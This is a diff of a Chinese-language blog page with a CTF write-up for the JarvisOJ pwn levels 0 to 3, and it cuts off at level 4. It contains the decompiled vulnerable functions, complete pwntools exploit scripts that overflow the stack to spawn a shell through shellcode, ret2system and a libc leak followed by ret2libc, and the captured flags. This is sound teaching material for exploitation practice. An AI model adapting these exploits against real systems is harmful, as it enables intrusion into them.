@@ -201,234 +201,281 @@
         </header>
 
         <div class="post-content">
-            <p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg" alt=""></p>
-<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此<br>不定期更新<br><a id="more"></a></p>
-<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>很直接地给出了漏洞函数<code>vulnerable_function()</code>以及要溢出跳转到的函数<code>callsystem()</code>其中<code>callsystem()</code>地址为<code>0x400596</code><br><code>read</code>读入512字节但是<code>buf</code>只有0x80大小，很明显的栈溢出构造ROP劫持控制流到<code>callsystem()</code>执行</p>
-<pre><code class="lang-C">ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-80h]@1
-  return read(0, &amp;buf, 512uLL);
-}
-</code></pre>
-<p>查看栈结构很容易得知溢出长度是<code>0x80+0x8=0x88</code><br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg" alt=""><br>然后劫持到<code>callsystem()</code>的地址<code>0x400596</code>即可<br>poc:</p>
-<pre><code class="lang-python">from pwn import * 
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9881)
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)        
-payload = &quot;A&quot;*0x88
-payload += p64(0x400596)
-respone(&quot;World\n&quot;,payload)
-pro.interactive()
-</code></pre>
+            <p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg"></p>
+<h2 id="引言">引言</h2>
+<p>最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此
+不定期更新 <a id="more"></a></p>
+<h1 id="level-0">level 0</h1>
+<p>很直接地给出了漏洞函数<code>vulnerable_function()</code>以及要溢出跳转到的函数<code>callsystem()</code>其中<code>callsystem()</code>地址为<code>0x400596</code>
+<code>read</code>读入512字节但是<code>buf</code>只有0x80大小，很明显的栈溢出构造ROP劫持控制流到<code>callsystem()</code>执行</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">ssize_t</span> vulnerable_function<span class="op">()</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">;</span> <span class="co">// [sp+0h] [bp-80h]@1</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">,</span> <span class="dv">512</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>查看栈结构很容易得知溢出长度是<code>0x80+0x8=0x88</code> <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg">
+然后劫持到<code>callsystem()</code>的地址<code>0x400596</code>即可
+poc:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9881</span>)</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)      </span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="bn">0x400596</span>)</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;World</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
 <p><strong>Flag: CTF{713ca3944e92180e0ef03171981dcd41}</strong></p>
-<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>如level0一样，给出漏洞函数</p>
-<pre><code class="lang-C">ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-88h]@1
-  printf(&quot;What&#39;s this:%p?\n&quot;, &amp;buf);
-  return read(0, &amp;buf, 0x100u);
-}
-</code></pre>
-<p>很明显地栈溢出以及提示你栈地址在哪，然后<code>checksec</code>查看保护，NX(堆栈不可执行)保护没开，那很显然思路就是将<code>shellCode</code>写入栈，然后ROP控制指针跳回栈地址执行<code>shellCode</code><br>poc:</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./level1&quot;)
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9877)
-context.log_level = &#39;debug&#39;
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-address = pro.recvuntil(&#39;?&#39;)[-11:-1]
-#print address
-address = int(address,16)
-print hex(address)
-payload = asm(shellcraft.sh()).ljust(140,&#39;\x00&#39;)
-payload += p64(address)
-pro.sendline(payload)
-pro.interactive()
-</code></pre>
+<h1 id="level-1">level 1</h1>
+<p>如level0一样，给出漏洞函数</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">ssize_t</span> vulnerable_function<span class="op">()</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">;</span> <span class="co">// [sp+0h] [bp-88h]@1</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;What&#39;s this:%p?</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">);</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">,</span> <span class="bn">0x100</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>很明显地栈溢出以及提示你栈地址在哪，然后<code>checksec</code>查看保护，NX(堆栈不可执行)保护没开，那很显然思路就是将<code>shellCode</code>写入栈，然后ROP控制指针跳回栈地址执行<code>shellCode</code>
+poc:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./level1&quot;)</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9877</span>)</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>address <span class="op">=</span> pro.recvuntil(<span class="st">&#39;?&#39;</span>)[<span class="op">-</span><span class="dv">11</span>:<span class="op">-</span><span class="dv">1</span>]</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="co">#print address</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>address <span class="op">=</span> <span class="bu">int</span>(address,<span class="dv">16</span>)</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> <span class="bu">hex</span>(address)</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> asm(shellcraft.sh()).ljust(<span class="dv">140</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(address)</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>pro.sendline(payload)</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
 <p><strong>Flag：CTF{82c2aa534a9dede9c3a0045d0fec8617}</strong></p>
-<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>同样给出漏洞函数，其中包含<code>system</code>函数(地址<code>0x804845C</code>)和栈溢出，还给了一个hint――<code>/bin/sh</code>字符串。</p>
-<pre><code class="lang-C">ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-88h]@1
-  system(&quot;echo Input:&quot;);
-  return read(0, &amp;buf, 0x100u);
-}
-</code></pre>
-<p>思路也就很明了了，栈溢出ROP到system地址，且追加<code>/bin/sh</code>地址进栈，作为<code>system</code>的参数<br>poc:</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./level2&quot;)
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9878)
-context.log_level = &#39;debug&#39;
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-bin_sh_addr = 0x804A024
-payload = &quot;A&quot;*0x88
-payload += &quot;\x00&quot;*4
-payload += p32(0x804845C)
-payload += p32(bin_sh_addr)
-respone(&quot;Input:\n&quot;,payload)
-pro.interactive()
-</code></pre>
+<h1 id="level-2">level 2</h1>
+<p>同样给出漏洞函数，其中包含<code>system</code>函数(地址<code>0x804845C</code>)和栈溢出，还给了一个hint――<code>/bin/sh</code>字符串。</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">ssize_t</span> vulnerable_function<span class="op">()</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">;</span> <span class="co">// [sp+0h] [bp-88h]@1</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  system<span class="op">(</span><span class="st">&quot;echo Input:&quot;</span><span class="op">);</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">,</span> <span class="bn">0x100</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>思路也就很明了了，栈溢出ROP到system地址，且追加<code>/bin/sh</code>地址进栈，作为<code>system</code>的参数
+poc:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./level2&quot;)</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9878</span>)</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>bin_sh_addr <span class="op">=</span> <span class="bn">0x804A024</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span><span class="op">*</span><span class="dv">4</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(<span class="bn">0x804845C</span>)</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(bin_sh_addr)</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
 <p><strong>FLag: CTF{1759d0cbd854c54ffa886cd9df3a3d52}</strong></p>
-<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>这次给了<code>libc</code><br>老套路，还是给出了漏洞函数，只有栈溢出和<code>write</code>函数</p>
-<pre><code class="lang-C">ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-88h]@1
-  write(1, &quot;Input:\n&quot;, 7u);
-  return read(0, &amp;buf, 0x100u);
-}
-</code></pre>
-<p>这次给出了<code>libc</code>，思路也很明显。</p>
-<ol>
-<li>用<code>write</code>函数泄露出<code>write</code>的真实内存地址(通过泄露got表中对应的write条目实现)</li>
-<li>然后利用<code>write</code>函数真实内存地址减去给的<code>libc</code>中<code>write</code>函数的偏移得到<code>imageBase</code></li>
-<li>最后<code>imageBase</code>加上<code>libc</code>中<code>system</code>的偏移就是真实内存地址了，<code>/bin/sh</code>地址同理。</li>
-<li>构造ROP执行<code>system</code><br>详细控制过程看poc注释<br>poc:<br>``` python<br>from pwn import * <h1 id="pro-process-“-level3”"><a href="#pro-process-“-level3”" class="headerlink" title="pro = process(“./level3”)"></a>pro = process(“./level3”)</h1>pro = remote(“pwn2.jarvisoj.com”, 9879)<br>context.log_level = ‘debug’<br>libc = ELF(“./libc-2.19.so”)<br>elf = ELF(“./level3”)<br>def respone(recv_buf,send_buf,new_line=True):<br> pro.recvuntil(recv_buf)<br> if new_line:<pre><code> pro.sendline(send_buf)
-</code></pre> else:<pre><code> pro.send(send_buf)
-</code></pre></li>
-</ol>
-<p>payload = “A”*0x88<br>payload += “\x00\x00\x00\x00”<br>payload += p32(elf.plt[‘write’])#跳到write plt执行write函数<br>payload +=p32(0x8048495)#执行完write之后的返回地址，此处为vulnerable_function()地址<br>payload +=p32(1)#arg1<br>payload +=p32(elf.got[‘write’])#arg2<br>payload +=p32(4)#arg3</p>
-<h1 id="得到write的真实内存地址"><a href="#得到write的真实内存地址" class="headerlink" title="得到write的真实内存地址"></a>得到write的真实内存地址</h1><p>respone(“Input:\n”,payload)<br>write_addr = u32(pro.recv(4))</p>
-<h1 id="通过libc中函数之前偏移，计算system地址和字符串”-bin-sh”地址"><a href="#通过libc中函数之前偏移，计算system地址和字符串”-bin-sh”地址" class="headerlink" title="通过libc中函数之前偏移，计算system地址和字符串”/bin/sh”地址"></a>通过libc中函数之前偏移，计算system地址和字符串”/bin/sh”地址</h1><p>log.info(“write_addr:%s”,hex(write_addr))<br>imageBase = write_addr - libc.symbols[‘write’]#得到libc内存加载基址<br>log.info(“imageBase:%s”,hex(imageBase))<br>system_addr = imageBase + libc.symbols[‘system’]#计算system真实地址<br>bin_sh_addr = imageBase + next(libc.search(‘/bin/sh’))#计算/bin/sh真实地址<br>log.info(“system_addr:%s”,hex(system_addr))<br>log.info(“bin_sh_addr:%s”,hex(bin_sh_addr))<br>payload = “A”*0x88<br>payload += “\x00\x00\x00\x00”<br>payload += p32(system_addr)#劫持到system地址<br>payload += p32(0xf)#随便给个调用完system后的返回地址<br>payload +=p32(bin_sh_addr)#arg1<br>respone(“Input:\n”,payload)#再次溢出<br>pro.interactive()</p>
-<pre><code>**Flag: CTF{d85346df5770f56f69025bc3f5f1d3d0}**
-# level 4
-
-一样给出存在溢出漏洞的函数,但是没有给`libc`和其他任何提示
-plt中存在`read`和`write`函数
-
-![](JarvisOJ-PWN-Writeup专题/19-30-17.jpg)
-``` C
-ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-88h]@1
-  return read(0, &amp;buf, 0x100u);
-}
-</code></pre><p>既然这样，我们只能在无<code>libc</code>的情况下的ROP<br>我们有两个选择</p>
-<blockquote>
-<ol>
-<li>利用write函数泄露内存，加上pwntools中的DynELF函数遍历got表，猜解lic版本和system函数及”/bin/sh”字符串的位置，然后ROP起shell</li>
-<li>利用read函数将”/bin/sh”字符串写入可写位置，然后利用read函数中的syscall起shell</li>
-</ol>
-</blockquote>
+<h1 id="level-3">level 3</h1>
+<p>这次给了<code>libc</code>
+老套路，还是给出了漏洞函数，只有栈溢出和<code>write</code>函数</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">ssize_t</span> vulnerable_function<span class="op">()</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">;</span> <span class="co">// [sp+0h] [bp-88h]@1</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span><span class="dv">1</span><span class="op">,</span> <span class="st">&quot;Input:</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="dv">7</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">,</span> <span class="bn">0x100</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>这次给出了<code>libc</code>，思路也很明显。 1.
+用<code>write</code>函数泄露出<code>write</code>的真实内存地址(通过泄露got表中对应的write条目实现)
+2.
+然后利用<code>write</code>函数真实内存地址减去给的<code>libc</code>中<code>write</code>函数的偏移得到<code>imageBase</code>
+3.
+最后<code>imageBase</code>加上<code>libc</code>中<code>system</code>的偏移就是真实内存地址了，<code>/bin/sh</code>地址同理。
+4. 构造ROP执行<code>system</code> 详细控制过程看poc注释 poc:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./level3&quot;)</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9879</span>)</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> ELF(<span class="st">&quot;./libc-2.19.so&quot;</span>)</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./level3&quot;</span>)</span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&quot;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&quot;</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(elf.plt[<span class="st">&#39;write&#39;</span>])<span class="co">#跳到write plt执行write函数</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="bn">0x8048495</span>)<span class="co">#执行完write之后的返回地址，此处为vulnerable_function()地址</span></span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="dv">1</span>)<span class="co">#arg1</span></span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(elf.got[<span class="st">&#39;write&#39;</span>])<span class="co">#arg2</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="dv">4</span>)<span class="co">#arg3</span></span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a><span class="co">#得到write的真实内存地址</span></span>
+<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>write_addr <span class="op">=</span> u32(pro.recv(<span class="dv">4</span>))</span>
+<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a><span class="co">#通过libc中函数之前偏移，计算system地址和字符串&quot;/bin/sh&quot;地址</span></span>
+<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&quot;write_addr:</span><span class="sc">%s</span><span class="st">&quot;</span>,<span class="bu">hex</span>(write_addr))</span>
+<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a>imageBase <span class="op">=</span> write_addr <span class="op">-</span> libc.symbols[<span class="st">&#39;write&#39;</span>]<span class="co">#得到libc内存加载基址</span></span>
+<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&quot;imageBase:</span><span class="sc">%s</span><span class="st">&quot;</span>,<span class="bu">hex</span>(imageBase))</span>
+<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> imageBase <span class="op">+</span> libc.symbols[<span class="st">&#39;system&#39;</span>]<span class="co">#计算system真实地址</span></span>
+<span id="cb8-30"><a href="#cb8-30" aria-hidden="true" tabindex="-1"></a>bin_sh_addr <span class="op">=</span> imageBase <span class="op">+</span> <span class="bu">next</span>(libc.search(<span class="st">&#39;/bin/sh&#39;</span>))<span class="co">#计算/bin/sh真实地址</span></span>
+<span id="cb8-31"><a href="#cb8-31" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&quot;system_addr:</span><span class="sc">%s</span><span class="st">&quot;</span>,<span class="bu">hex</span>(system_addr))</span>
+<span id="cb8-32"><a href="#cb8-32" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&quot;bin_sh_addr:</span><span class="sc">%s</span><span class="st">&quot;</span>,<span class="bu">hex</span>(bin_sh_addr))</span>
+<span id="cb8-33"><a href="#cb8-33" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb8-34"><a href="#cb8-34" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&quot;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&quot;</span></span>
+<span id="cb8-35"><a href="#cb8-35" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(system_addr)<span class="co">#劫持到system地址</span></span>
+<span id="cb8-36"><a href="#cb8-36" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(<span class="bn">0xf</span>)<span class="co">#随便给个调用完system后的返回地址</span></span>
+<span id="cb8-37"><a href="#cb8-37" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(bin_sh_addr)<span class="co">#arg1</span></span>
+<span id="cb8-38"><a href="#cb8-38" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)<span class="co">#再次溢出</span></span>
+<span id="cb8-39"><a href="#cb8-39" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
+<p><strong>Flag: CTF{d85346df5770f56f69025bc3f5f1d3d0}</strong></p>
+<h1 id="level-4">level 4</h1>
+<p>一样给出存在溢出漏洞的函数,但是没有给<code>libc</code>和其他任何提示
+plt中存在<code>read</code>和<code>write</code>函数</p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-30-17.jpg"></p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">ssize_t</span> vulnerable_function<span class="op">()</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
